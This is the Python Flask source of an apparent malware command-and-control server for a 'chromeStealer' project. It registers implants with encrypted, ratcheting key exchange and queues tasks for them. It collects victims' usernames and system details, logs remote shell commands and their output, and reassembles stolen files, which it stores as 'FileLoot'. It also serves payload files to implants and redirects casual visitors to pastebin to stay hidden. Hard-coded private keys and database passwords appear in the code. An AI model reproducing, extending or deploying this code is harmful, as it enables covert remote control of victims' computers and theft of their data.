from flask import Flask, request, render_template, redirect, url_for, jsonify, send_from_directory, abort, Response
from werkzeug.utils import secure_filename, safe_join
# from database import db, FileDownloaded, Beacon, RegisteredImplants, ImplantsTask, approvedURL, ShellCommandLog, FileLoot, infoGathered
from database import *
from message_pb2 import *
from nacl.public import PrivateKey, PublicKey, SealedBox
from nacl.encoding import Base64Encoder
from nacl.bindings import crypto_kx, crypto_aead
from nacl.hashlib import blake2b
import hashlib
import secrets
import base64
from sqlalchemy import desc
from sqlalchemy.exc import SQLAlchemyError
import urllib.parse
from datetime import datetime
import os
import sqlite3
from Cryptodome.Cipher import AES
import re

def load_key_pair_from_base64(private_key_base64, public_key_base64):
    # Decode the Base64-encoded keys back to bytes
    private_key_bytes = Base64Encoder.decode(private_key_base64)
    public_key_bytes = Base64Encoder.decode(public_key_base64)
    # Load the bytes back into PrivateKey and PublicKey objects
    private_key = PrivateKey(private_key_bytes)
    public_key = PublicKey(public_key_bytes)
    return private_key, public_key
def load_pub_key_from_base64(key_base64):
    # Decode the Base64-encoded keys back to bytes
    public_key_bytes = Base64Encoder.decode(key_base64)
    # Load the bytes back into PrivateKey and PublicKey objects
    public_key = PublicKey(public_key_bytes)
    return public_key
def derive_nonce_from_key(key):
    hash = blake2b(data=key, digest_size=32).digest()
    nonce = hash[0:8]
    key_kdf = hash[-24:]
    return nonce, key_kdf

server_pk_base64 = "H9luw7Iil2BrayAS9Pu2yrvirN/fdZ9oqPFyk99lYQ8="  # These are hard coded
server_sk_base64 = "Q0kkUpWLdDJA/8c210MCcjeRl6l9MURA3Ri/4Bnk4zU="  # These are hard coded
server_sk_fixed, server_pk_fixed = load_key_pair_from_base64(server_sk_base64, server_pk_base64)

def generate_random_sha256():
    random_bytes = secrets.token_bytes(32)  # Generate a random byte string of 32 bytes
    sha256_hash = hashlib.sha256()  # Create a SHA256 hash object
    sha256_hash.update(random_bytes)  # Update the hash object with the random bytes
    hex_dig = sha256_hash.hexdigest() # Get the hexadecimal representation of the digest
    return hex_dig

def derive_nonce_kdf_session(key):
    kdf = blake2b(data=key[0:16], digest_size=32).digest()
    session_key = blake2b(data=key[16:32], digest_size=32).digest()
    nonce = blake2b(data=session_key, digest_size=8).digest()
    return nonce, kdf, session_key

def derive_guid_hash_b64(key):
    guid_hash = blake2b(data=key, digest_size=32).digest()
    return Base64Encoder.encode(guid_hash).decode('utf-8')

def stripbs(input_str):
    chars_to_strip = "+/=%"  # Define the characters to be stripped
    stripped_str = ''.join(c for c in input_str if c not in chars_to_strip)  # filter out the characters to be stripped
    return stripped_str

# add function, 
app = Flask(__name__)
app.config['DEBUG'] = True
# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'  # Using SQLite for simplicity

app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://edcentauri:malware6983@localhost/malware'  
# Using postgresql, I had to enabled superuser for this account inorder to get it work
# Download postgresql before using, 
# add a database named malware, add a user named edcentauri with password malware6983

db.init_app(app)    

def parse_string(input_string):
    # Split the string at every colon (":")
    result = input_string.split(":")
    return result

@app.cli.command("init-db")
def init_db_command():
    """Clear the existing data and create new tables."""
    db.drop_all()  # Be cautious with this in production environments
    db.create_all()
    print("Initialized the database.")

def remove_leading_non_alphanumeric(s):
    # Find the index of the first alphanumeric character
    match = re.search(r'[A-Za-z0-9]', s)
    if match:
        # Return the substring from the first alphanumeric character to the end
        return s[match.start():]
    else:
        # If no alphanumeric characters are found, return an empty string
        return 'a'

@app.cli.command("construct_file")
def construct_file():
    # Ensure the directory exists
    file_path = './fileFromImplant/'
    if not os.path.exists(file_path):
        os.makedirs(file_path)

    # Query the database for distinct filenames
    try:
        unique_filenames = db.session.query(FileLoot.filename).distinct().all()
        filenames_list = [filename[0] for filename in unique_filenames]

        for filename in filenames_list:
            filename_sanitized = remove_leading_non_alphanumeric(filename)
            print(filename_sanitized)
            full_path = os.path.join(file_path, filename_sanitized)
            print(f"Constructing file: {full_path}")
            files_entry = FileLoot.query.filter_by(filename=filename).order_by(FileLoot.order.asc()).all()
            for entry in files_entry:
                with open(full_path, 'ab') as file:
                    # Write the raw bytes to the file
                    file.write(entry.chunk)
        
        return jsonify({"success": True, "message": "Files constructed successfully."}), 200
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

# Add this route to your Flask app
@app.route('/')
def welcome_page():
    return redirect("https://pastebin.com/", code=302)

@app.route('/<url_verify>')
def admin_portal(url_verify):
    if url_verify != "H9luw7Iil2BrayAS9Pu2yrvirN":
        return redirect("https://pastebin.com/", code=302)
    registered_implants = RegisteredImplants.query.all()
    tasks = ImplantsTask.query.all()
    Beacons = Beacon.query.all()
    shellcmds = ShellCommandLog.query.all()
    infogathered = infoGathered.query.all()
    return render_template('admin_portal.html', 
                            registered_implants=registered_implants, 
                            infogathered=infogathered,
                            tasks=tasks, 
                            Beacons=Beacons, 
                            shellcmds=shellcmds)

# @app.route('/commands/<implant_id>')
# def get_commands(implant_id):
#     commands = ShellCommandLog.query.filter_by(client_guid=implant_id).all()
#     return jsonify([{'id': command.id, 'command': command.command_executed} for command in commands])

# @app.route('/result/<command_id>')
# def get_result(command_id):
#     command = ShellCommandLog.query.get(command_id)
#     return jsonify({'result': command.result if command else ''})

# Get shell command
@app.route('/783ebb1071ae840fda8f11')
def get_shellcmd_result():
    id = request.args.get('commandId')

    command_log = ShellCommandLog.query.filter_by(id=id).first()
    print(command_log)
    if command_log:
        return jsonify({'result': command_log.result}), 200
    else:
        return jsonify({'error': 'No result found for the specified parameters'}), 404

@app.route('/512cb2c5017819a6688a7', methods=['POST'])
def submit_task():
    try:
        task_id = request.form.get('task')
        args = request.form.get('args')
        client_guid = request.form.get('client')

        if not task_id or not client_guid:
            print("Missing required parameters.")
            return "", 403

        if len(args) > 128:
            print("Arguments too long")
            return "", 403

        # Sanitize the task submission here
        match task_id:
            case "1":
                if any(c.isalpha() for c in args):
                    print("ADJUST_BEACON should not have alphabetic args")
                    return "", 403
        
        new_task = ImplantsTask(
            client_guid=client_guid,
            current_task=task_id,
            current_args=args
        )

        db.session.add(new_task)
        db.session.commit()
        print("New task committed successfully!")
        return {}, 200

    except SQLAlchemyError as e:
        db.session.rollback()
        print(f"Database error: {str(e)}")  # Log the error for debugging
        return redirect(url_for('admin_portal'))

    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")  # Log the error for debugging
        return redirect(url_for('admin_portal'))

# @app.route('/compile-file', methods=['POST'])
# def compile_file():
#     client_guid = request.form.get('client_guid')
#     filename = request.form.get('filename')



@app.route('/570d3879356/<url_test_urlen>', methods=["POST"])
def handle_beacon(url_test_urlen):
    ### Get the data for implant ###
    print("[+] /beacon receives Data from implant")

    ### Validate Connection
    # Decode URL encoded B64
    url_test = urllib.parse.unquote(url_test_urlen)
    check_entry = approvedURL.query.filter_by(url_next=url_test).first()
    if not check_entry:
        print("[-] No Current URL Found")
        print("url_test I got:", url_test)
        return "Access Denied", 403
    
    req_data = request.get_data()
    msg_enc_bin = Base64Encoder.decode(req_data)
    
    ### Decapsulate data
    msg_enc = Message_encrypt()
    msg_enc.ParseFromString(msg_enc_bin)
    print("msg_enc:", msg_enc)

    ### Verify ID
    guid_ephemeral_carrier = msg_enc.guid
    guid_ephemeral_carrier_check = check_entry.client_guid_ephemeral
    if msg_enc.guid != guid_ephemeral_carrier_check:
        print("[-] No guid_ephemeral Found")
        print("guid_ephemeral_carrier:", guid_ephemeral_carrier)
        print("guid_ephemeral_carrier_check", guid_ephemeral_carrier_check)
        print("client_guid", check_entry.client_guid)
        return "Access Denied", 403

    guid_carrier = check_entry.client_guid

    print("[+] Get Real GUID (Not Ephemeral) Connection", guid_carrier)
    
    ### Retrieve the sym keys
    rgt_entry = RegisteredImplants.query.filter_by(client_guid=guid_carrier).first()
    if not rgt_entry:
        print("[-] No GUID found")
        return "Access Denied", 403

    server_tk_ephemeral = rgt_entry.server_tk_ephemeral
    nonce_send = rgt_entry.nonce_send
    key_kdf_send = rgt_entry.key_kdf_send

    server_rk_ephemeral = rgt_entry.server_rk_ephemeral
    nonce_rcv = rgt_entry.nonce_rcv
    key_kdf_rcv = rgt_entry.key_kdf_rcv

    key_kdf_guid = rgt_entry.key_kdf_guid

    ### Decrypt the data
    ciphertext = msg_enc.ciphertext
    plaintext = crypto_aead.crypto_aead_chacha20poly1305_decrypt(ciphertext, None, nonce_rcv, server_rk_ephemeral)
    
    # Parse the msg
    msg_dec = Beacon_pulse()
    msg_dec.ParseFromString(plaintext)
    real_guid = msg_dec.guid
    if msg_dec.guid != guid_carrier:
        print("[!] Beacon guid doesn't match msg")
        print("msg_dec.guid: ", msg_dec.guid)
        print("Guid I have is: ", guid_carrier)

    Beacon.add_or_update_beacon(guid=real_guid)
    print("[+] Beacon Msg parsed, logged in DB")

    ### Retrieve Task list
    latest_task = ImplantsTask.query.filter_by(client_guid=real_guid).order_by(desc(ImplantsTask.date_commited)).first()
    
    cur_task = latest_task.current_task
    cur_args = latest_task.current_args
    
    print("[+] Task Retrieved:",cur_task,cur_args)
    ### Create Task Response
    newTask = TaskRequest()
    newTask.Args = cur_args
    newTask.Opcode = cur_task
    newTask.guid = real_guid
    plaintext = newTask.SerializeToString(newTask)
    ### Encrypt Data
    ciphertext = crypto_aead.crypto_aead_chacha20poly1305_encrypt(plaintext, None, nonce_send, server_tk_ephemeral)
    print("nonce_send:", Base64Encoder.encode(nonce_send))
    print("server_tk_ephemeral:", Base64Encoder.encode(server_tk_ephemeral))
    ciphertext_b64 = Base64Encoder.encode(ciphertext)
    print("[+] Ciphertext encoded")
    
    ### Add rachet
    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(key_kdf_rcv)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(key_kdf_send)    
    suburl_bin, key_kdf_guid, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    # print("client_guid_ephemeral b64: ", Base64Encoder.encode(client_guid_ephemeral).decode('utf-8'))
    
    rgt_entry.server_rk_ephemeral = sk_rcv
    rgt_entry.nonce_rcv = nonce_rcv
    rgt_entry.key_kdf_rcv = key_kdf_rcv

    rgt_entry.server_tk_ephemeral = sk_send
    rgt_entry.nonce_send = nonce_send
    rgt_entry.key_kdf_send = key_kdf_send

    rgt_entry.key_kdf_guid = key_kdf_guid
    rgt_entry.last_connection = datetime.utcnow()
    check_entry.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode('utf-8')
    check_entry.url_next = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))
    if cur_task != 0:
        new_task = ImplantsTask(
            client_guid = real_guid,
            current_task = 0,
            current_args = "",
            comment="Automatically Added"
        )
        db.session.add(new_task)

    latest_task.comment = "Dispensed"
    db.session.commit()

    print("[+] New Rachet Added to DB")


    print(ciphertext_b64)
    return ciphertext_b64, 200

@app.route('/93c6f53e7c1/<url_test_urlen>', methods=["POST"])
def handle_infogather(url_test_urlen):
    url_test = urllib.parse.unquote(url_test_urlen)
    check_entry = approvedURL.query.filter_by(url_next=url_test).first()
    if not check_entry:
        print("[-] No Current URL Found")
        print("url_test I got:", url_test)
        return "Access Denied", 403

    req_data = request.get_data()
    print(req_data)
    ### Decapsulate data
    msg_enc = Message_encrypt()
    msg_enc.ParseFromString(req_data)
    ### Verify ID
    guid_ephemeral = msg_enc.guid
    guid_ephemeral_check = check_entry.client_guid_ephemeral
    if msg_enc.guid != guid_ephemeral_check:
        print("[-] No guid_ephemeral Found")
        print("guid_ephemeral:", guid_ephemeral)
        print("guid_ephemeral_check", guid_ephemeral_check)
        print("client_guid", check_entry.client_guid)
        return "Access Denied", 403

    client_guid = check_entry.client_guid
    rgt_entry = RegisteredImplants.query.filter_by(client_guid=client_guid).first()

    server_tk_ephemeral = rgt_entry.server_tk_ephemeral
    nonce_send = rgt_entry.nonce_send
    key_kdf_send = rgt_entry.key_kdf_send

    server_rk_ephemeral = rgt_entry.server_rk_ephemeral
    nonce_rcv = rgt_entry.nonce_rcv
    key_kdf_rcv = rgt_entry.key_kdf_rcv

    key_kdf_guid = rgt_entry.key_kdf_guid

    ### Decrypt the data
    ciphertext = msg_enc.ciphertext
    plaintext = crypto_aead.crypto_aead_chacha20poly1305_decrypt(ciphertext, None, nonce_rcv, server_rk_ephemeral)

    info_gathered = InfoGather()
    try:
        info_gathered.ParseFromString(plaintext)
    except Exception as e:
        print(f"Failed to decode Protobuf message: {e}")
        return "Failed to decode Protobuf message", 400
    
    print(f"username: {info_gathered.username}")
    print(f"windows: {info_gathered.windows}")
    print(f"productname: {info_gathered.productname}")
    print(f"CPU: {info_gathered.CPU}")
    print(f"devicename: {info_gathered.devicename}")
    print(f"mem: {info_gathered.mem}")
    
    ### Add rachet
    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(key_kdf_rcv)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(key_kdf_send)    
    suburl_bin, key_kdf_guid, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    print("client_guid_ephemeral b64: ", Base64Encoder.encode(client_guid_ephemeral).decode('utf-8'))
    
    rgt_entry.server_rk_ephemeral = sk_rcv
    rgt_entry.nonce_rcv = nonce_rcv
    rgt_entry.key_kdf_rcv = key_kdf_rcv

    rgt_entry.server_tk_ephemeral = sk_send
    rgt_entry.nonce_send = nonce_send
    rgt_entry.key_kdf_send = key_kdf_send

    rgt_entry.key_kdf_guid = key_kdf_guid

    check_entry.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode('utf-8')
    check_entry.url_next = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))
    info_gather_entry = infoGathered.query.filter_by(client_guid=client_guid).first()
    if not info_gather_entry:
        info_gather_new = infoGathered(client_guid=client_guid,
                                       username=info_gathered.username,
                                       windows =info_gathered.windows,
                                       CPU=info_gathered.CPU,
                                       devicename = info_gathered.devicename,
                                       mem = info_gathered.mem)
        db.session.add(info_gather_new)
    else:
        info_gather_entry.username = info_gathered.username
        info_gather_entry.windows = info_gathered.windows
        info_gather_entry.CPU = info_gathered.CPU
        info_gather_entry.devicename = info_gathered.devicename
        info_gather_entry.mem = info_gathered.mem

    db.session.commit()
    return "OK" , 200

@app.route('/3cde155e69/<url_test_urlen>', methods=["POST"])
def handle_register(url_test_urlen):
    # Decode URL encoded B64
    # print("I got undecoded URL", url_test_urlen)
    # url_test = urllib.parse.unquote(url_test_urlen)
    # print("I got decoded URL", url_test)
    print(url_test_urlen)
    url_test = url_test_urlen
    crypto_box_sealed_b64 = request.get_data()
    print("/register receives:", crypto_box_sealed_b64)

    # Decode
    ciphertext_sealed_bin = Base64Encoder.decode(crypto_box_sealed_b64)

    # Unseal the box
    unseal_box = SealedBox(server_sk_fixed)
    try:
        plaintext_bin = unseal_box.decrypt(ciphertext_sealed_bin)
    except Exception as e:
        return "ACCESS DENIED: Can't decrypt", 403

    # deserialize
    msg_reg = Key_negotiation_implant()
    msg_reg.ParseFromString(plaintext_bin)

    # Prevent Replay Attacks by checking the URL
    suburl_bin, key_kdf_guid, _ = derive_nonce_kdf_session(msg_reg.client_pk_bin)
    if stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8')) != url_test:
        print("suburl stripped:", stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8')))
        print("url_test: ", url_test)
        return "ACCESS DENIED: Not Approved URL", 403


    # generate server_pk_dedicated / server_sk_dedicated
    server_sk_dedicated = PrivateKey.generate()
    server_pk_dedicated = server_sk_dedicated.public_key
    

    server_rk, server_tk = crypto_kx.crypto_kx_server_session_keys(server_pk_dedicated.encode(), server_sk_dedicated.encode(), msg_reg.client_pk_bin)
    
    print("server_rk:", Base64Encoder.encode(server_rk))
    print("server_tk:", Base64Encoder.encode(server_tk))
    print("key_kdf_guid:", Base64Encoder.encode(key_kdf_guid))

    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(server_rk)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(server_tk)
    suburl_bin, key_kdf_guid_new, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    
    print("nonce_rcv: ", Base64Encoder.encode(nonce_rcv))
    print("key_kdf_rcv: ", Base64Encoder.encode(key_kdf_rcv))
    print("sk_rcv: ", Base64Encoder.encode(sk_rcv))

    print("nonce_send: ", Base64Encoder.encode(nonce_send))
    print("key_kdf_send: ", Base64Encoder.encode(key_kdf_send))
    print("sk_send: ", Base64Encoder.encode(sk_send))

    print("client_guid: ", Base64Encoder.encode(msg_reg.client_pk_bin))

    print("suburl_bin: ", Base64Encoder.encode(suburl_bin))
    print("key_kdf_guid_new: ", Base64Encoder.encode(key_kdf_guid_new))
    print("client_guid_ephemeral: ", Base64Encoder.encode(client_guid_ephemeral).decode("utf-8"))
    
    # Existing implant
    existing_implant = RegisteredImplants.query.filter_by(client_guid=msg_reg.client_guid).first()
    existing_url = approvedURL.query.filter_by(client_guid=msg_reg.client_guid).first()
    suburl_b64_stripped = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))

    if existing_implant:
        existing_implant.client_pk = msg_reg.client_pk_bin
        existing_implant.server_pk_dedicated = server_pk_dedicated.encode()
        existing_implant.server_sk_dedicated = server_sk_dedicated.encode()
        
        existing_implant.server_tk = server_tk
        existing_implant.server_rk = server_rk
        
        existing_implant.server_tk_ephemeral = sk_send
        existing_implant.nonce_send = nonce_send
        existing_implant.key_kdf_send = key_kdf_send

        existing_implant.server_rk_ephemeral = sk_rcv
        existing_implant.nonce_rcv = nonce_rcv
        existing_implant.key_kdf_rcv = key_kdf_rcv

        existing_implant.client_guid = msg_reg.client_guid
        existing_implant.key_kdf_guid = key_kdf_guid_new
        existing_implant.ratchet_times = existing_implant.ratchet_times + 1

        existing_url.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode("utf-8")
        existing_url.url_next = suburl_b64_stripped

    else:
        new_registration = RegisteredImplants(
            client_pk=msg_reg.client_pk_bin,
            server_pk_dedicated=server_pk_dedicated.encode(),
            server_sk_dedicated=server_sk_dedicated.encode(),

            server_tk=server_tk,
            server_rk=server_rk,
            
            server_tk_ephemeral=sk_send,
            nonce_send=nonce_send,
            key_kdf_send=key_kdf_send,
            
            server_rk_ephemeral=sk_rcv,
            nonce_rcv=nonce_rcv,
            key_kdf_rcv=key_kdf_rcv,

            client_guid=msg_reg.client_guid,
            key_kdf_guid=key_kdf_guid_new,
            ratchet_times = 0
        )

        new_task = ImplantsTask(
            client_guid = msg_reg.client_guid,
            current_task = 0,
            current_args = ""
        )

        new_approvedURL = approvedURL(
            client_guid = msg_reg.client_guid,
            client_guid_ephemeral=Base64Encoder.encode(client_guid_ephemeral).decode("utf-8"),
            url_next=suburl_b64_stripped
        )

        db.session.add(new_registration)
        db.session.add(new_task)
        db.session.add(new_approvedURL)
    
    db.session.commit()
    print("Database Registered")

    # seal the box with dedicated_pk enclosed
    sealed_box = SealedBox(PublicKey(msg_reg.client_pk_bin))
    message = server_pk_dedicated.encode()
    encrypted = sealed_box.encrypt(message)
    encrypted_b64 = Base64Encoder.encode(encrypted).decode('utf-8')
    print("server_rk:", Base64Encoder.encode(server_rk))
    print("server_tk", Base64Encoder.encode(server_tk))
    print("URL_expect", suburl_b64_stripped)
    return encrypted_b64, 200

@app.route('/284686a8870/<url_test_urlen>', methods=["POST"])
def handle_shellcmd(url_test_urlen):
    print("\n \n [+] ==========================> /shellcmd receives Data from implant")
    url_test = urllib.parse.unquote(url_test_urlen)
    print(url_test)
    check_entry = approvedURL.query.filter_by(url_next=url_test).first()
    if not check_entry:
        print("[-] Unauthorized suburl found")
        return "uhh", 404

    ### Decapsulate data
    msg_enc_bin = request.get_data()
    print("msg_enc_bin length:", len(msg_enc_bin))
    msg_enc = Message_encrypt_large()
    msg_enc.ParseFromString(msg_enc_bin)
    print("msg_enc:", msg_enc.guid_ephmeral)

    ### Verify ID
    guid_ephemeral_carrier = msg_enc.guid_ephmeral
    guid_ephemeral_carrier_check = check_entry.client_guid_ephemeral
    if msg_enc.guid_ephmeral != guid_ephemeral_carrier_check:
        print("[-] No guid_ephemeral Found")
        print("guid_ephemeral_carrier:", guid_ephemeral_carrier)
        print("guid_ephemeral_carrier_check", guid_ephemeral_carrier_check)
        print("client_guid", check_entry.client_guid)
        return "Access Denied", 403
    
    # Decrypt data
    guid_real = check_entry.client_guid
    print("[+] Get Real GUID (Not Ephemeral) Connection", guid_real)

    rgt_entry = RegisteredImplants.query.filter_by(client_guid=guid_real).first()     # Retrive the sym keys
    if not rgt_entry:
        print("[-] No GUID found")
        return "Access Denied", 403
    server_rk_ephemeral = rgt_entry.server_rk_ephemeral
    nonce_rcv = rgt_entry.nonce_rcv
    ciphertext = msg_enc.ciphertext
    plaintext = crypto_aead.crypto_aead_chacha20poly1305_decrypt(ciphertext, None, nonce_rcv, server_rk_ephemeral)
    
    # Parse the msg
    msg_dec = Shell_execution()
    msg_dec.ParseFromString(plaintext)
    print(msg_dec.guid)
    print(msg_dec.command)
    print(msg_dec.result)
    new_shell_cmd_entry = ShellCommandLog(client_guid=msg_dec.guid, command_executed=msg_dec.command, result=msg_dec.result)
    db.session.add(new_shell_cmd_entry)

    key_kdf_send = rgt_entry.key_kdf_send
    key_kdf_guid = rgt_entry.key_kdf_guid
    key_kdf_rcv = rgt_entry.key_kdf_rcv


    ### Add rachet
    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(key_kdf_rcv)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(key_kdf_send)    
    suburl_bin, key_kdf_guid, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    print("client_guid_ephemeral b64: ", Base64Encoder.encode(client_guid_ephemeral).decode('utf-8'))
    
    rgt_entry.server_rk_ephemeral = sk_rcv
    rgt_entry.nonce_rcv = nonce_rcv
    rgt_entry.key_kdf_rcv = key_kdf_rcv

    rgt_entry.server_tk_ephemeral = sk_send
    rgt_entry.nonce_send = nonce_send
    rgt_entry.key_kdf_send = key_kdf_send

    rgt_entry.key_kdf_guid = key_kdf_guid

    check_entry.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode('utf-8')
    check_entry.url_next = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))

    db.session.commit()
    return "OK", 200

@app.route('/cb733125db26/<url_test_urlen>', methods=["POST"])
def handle_upload(url_test_urlen):
    print("\n \n [+] ==========================> /upload receives Data from implant")
    url_test = urllib.parse.unquote(url_test_urlen)
    print(url_test)
    check_entry = approvedURL.query.filter_by(url_next=url_test).first()
    if not check_entry:
        print("[-] Unauthorized suburl found")
        return "uhh", 404

    ### Decapsulate data
    msg_enc_bin = request.get_data()
    print("msg_enc_bin length:", len(msg_enc_bin))
    msg_enc = Message_encrypt_large()
    msg_enc.ParseFromString(msg_enc_bin)
    print("msg_enc:", msg_enc.guid_ephmeral)

    ### Verify ID
    guid_ephemeral_carrier = msg_enc.guid_ephmeral
    guid_ephemeral_carrier_check = check_entry.client_guid_ephemeral
    if msg_enc.guid_ephmeral != guid_ephemeral_carrier_check:
        print("[-] No guid_ephemeral Found")
        print("guid_ephemeral_carrier:", guid_ephemeral_carrier)
        print("guid_ephemeral_carrier_check", guid_ephemeral_carrier_check)
        print("client_guid", check_entry.client_guid)
        return "Access Denied", 403
    
    # Decrypt data
    guid_real = check_entry.client_guid
    print("[+] Get Real GUID (Not Ephemeral) Connection", guid_real)

    rgt_entry = RegisteredImplants.query.filter_by(client_guid=guid_real).first()     # Retrive the sym keys
    if not rgt_entry:
        print("[-] No GUID found")
        return "Access Denied", 403
    server_rk_ephemeral = rgt_entry.server_rk_ephemeral
    nonce_rcv = rgt_entry.nonce_rcv
    ciphertext = msg_enc.ciphertext
    plaintext = crypto_aead.crypto_aead_chacha20poly1305_decrypt(ciphertext, None, nonce_rcv, server_rk_ephemeral)
    
    # Parse the msg
    msg_dec = FileStream()
    msg_dec.ParseFromString(plaintext)
    print(msg_dec.guid)
    print(msg_dec.order)
    print(msg_dec.filename)
    print(msg_dec.fileSize)
    print("chunk length: ", len(msg_dec.chunk))
    new_upload_entry = FileLoot(client_guid=msg_dec.guid, 
                                order=msg_dec.order, 
                                filename=msg_dec.filename,
                                fileSize=msg_dec.fileSize,
                                chunk=msg_dec.chunk)
    db.session.add(new_upload_entry)

    key_kdf_send = rgt_entry.key_kdf_send
    key_kdf_guid = rgt_entry.key_kdf_guid
    key_kdf_rcv = rgt_entry.key_kdf_rcv


    ### Add rachet
    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(key_kdf_rcv)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(key_kdf_send)    
    suburl_bin, key_kdf_guid, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    print("client_guid_ephemeral b64: ", Base64Encoder.encode(client_guid_ephemeral).decode('utf-8'))
    
    rgt_entry.server_rk_ephemeral = sk_rcv
    rgt_entry.nonce_rcv = nonce_rcv
    rgt_entry.key_kdf_rcv = key_kdf_rcv

    rgt_entry.server_tk_ephemeral = sk_send
    rgt_entry.nonce_send = nonce_send
    rgt_entry.key_kdf_send = key_kdf_send

    rgt_entry.key_kdf_guid = key_kdf_guid

    check_entry.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode('utf-8')
    check_entry.url_next = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))

    db.session.commit()
    return "OK", 200
    
@app.route('/4006384724e/<url_test_urlen>', methods=["POST"])
def download_file(url_test_urlen):
    # 3|example.txt|D:\INSIDIOUS\malware\chromeStealer_ground\main\fileDownload\
    # 574277009|LargeFile.exe|D:\INSIDIOUS\malware\chromeStealer_ground\main\fileDownload\
    url_test = urllib.parse.unquote(url_test_urlen)
    check_entry = approvedURL.query.filter_by(url_next=url_test).first()
    if not check_entry:
        print("[-] No Current URL Found")
        print("url_test I got:", url_test)
        return "Access Denied", 403


    ### Decapsulate data
    msg_enc_bin = request.get_data()
    msg_enc = Message_encrypt()
    msg_enc.ParseFromString(msg_enc_bin)
    
    ### Verify ID
    guid_ephemeral_carrier = msg_enc.guid
    guid_ephemeral_carrier_check = check_entry.client_guid_ephemeral
    guid_real = check_entry.client_guid

    if msg_enc.guid != guid_ephemeral_carrier_check:
        print("[-] No guid_ephemeral Found")
        print("guid_ephemeral_carrier:", guid_ephemeral_carrier)
        print("guid_ephemeral_carrier_check", guid_ephemeral_carrier_check)
        print("client_guid", check_entry.client_guid)
        return "Access Denied", 403
    
    ### Retrieve the sym keys
    rgt_entry = RegisteredImplants.query.filter_by(client_guid=guid_real).first()
    if not rgt_entry:
        print("[-] No GUID found")
        return "Access Denied", 403
    
    server_tk_ephemeral = rgt_entry.server_tk_ephemeral
    nonce_send = rgt_entry.nonce_send
    key_kdf_send = rgt_entry.key_kdf_send

    server_rk_ephemeral = rgt_entry.server_rk_ephemeral
    nonce_rcv = rgt_entry.nonce_rcv
    key_kdf_rcv = rgt_entry.key_kdf_rcv

    key_kdf_guid = rgt_entry.key_kdf_guid
    
    ### Decrypt the data
    ciphertext = msg_enc.ciphertext
    plaintext = crypto_aead.crypto_aead_chacha20poly1305_decrypt(ciphertext, None, nonce_rcv, server_rk_ephemeral)
    
    chunk_size = 3145728

    # Define the directory where your files are stored on the server    
    directory = "./fileToImplant/"
    
    # Get file chunk order
    msg_dec = File_Download_Request()
    msg_dec.ParseFromString(plaintext)

    # Ensure that the filename is safe to use
    try:
        # Use safe_join to securely construct a full path
        filepath = safe_join(directory, msg_dec.filename)
        print(filepath)
    except ValueError:
        # If the filename is not safe, return a 404 error
        abort(404)

    with open(filepath, 'rb') as file:
        file.seek(chunk_size * (msg_dec.order))
        bytes_data = file.read(chunk_size)
    
    msg_rep = File_Download_Response()
    msg_rep.order = msg_dec.order
    msg_rep.filename = msg_dec.filename
    msg_rep.chunkSize = len(bytes_data)
    msg_rep.fileSize = os.path.getsize(filepath)
    msg_rep.chunk = bytes_data
    
    # serialize here
    msg_rep_bin = msg_rep.SerializeToString()

    # add encryption here
    msg_rep_ciphertext = crypto_aead.crypto_aead_chacha20poly1305_encrypt(msg_rep_bin, None, nonce_send, server_tk_ephemeral)
    response = Response(msg_rep_ciphertext, mimetype='application/octet-stream', status=200)
    ### Add rachet
    nonce_rcv, key_kdf_rcv, sk_rcv = derive_nonce_kdf_session(key_kdf_rcv)
    nonce_send, key_kdf_send, sk_send = derive_nonce_kdf_session(key_kdf_send)    
    suburl_bin, key_kdf_guid, client_guid_ephemeral = derive_nonce_kdf_session(key_kdf_guid)
    rgt_entry.server_rk_ephemeral = sk_rcv
    rgt_entry.nonce_rcv = nonce_rcv
    rgt_entry.key_kdf_rcv = key_kdf_rcv

    rgt_entry.server_tk_ephemeral = sk_send
    rgt_entry.nonce_send = nonce_send
    rgt_entry.key_kdf_send = key_kdf_send

    rgt_entry.key_kdf_guid = key_kdf_guid
    check_entry.client_guid_ephemeral = Base64Encoder.encode(client_guid_ephemeral).decode('utf-8')
    check_entry.url_next = stripbs(Base64Encoder.encode(suburl_bin).decode('utf-8'))

    existing_file_downloaded = FileDownloaded.query.filter_by(client_guid=guid_real).first()
            
    if not existing_file_downloaded:
        # If not found, create a new beacon entry
        new_file_downloaded = FileDownloaded(client_guid=guid_real, 
                                             file_name=msg_dec.filename, 
                                             file_path_source=filepath, 
                                             file_size=msg_rep.fileSize)
        db.session.add(new_file_downloaded)
    
    db.session.commit()
    return response

def getSecretKey(secretKey):
    return base64.b64decode(secretKey)

def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
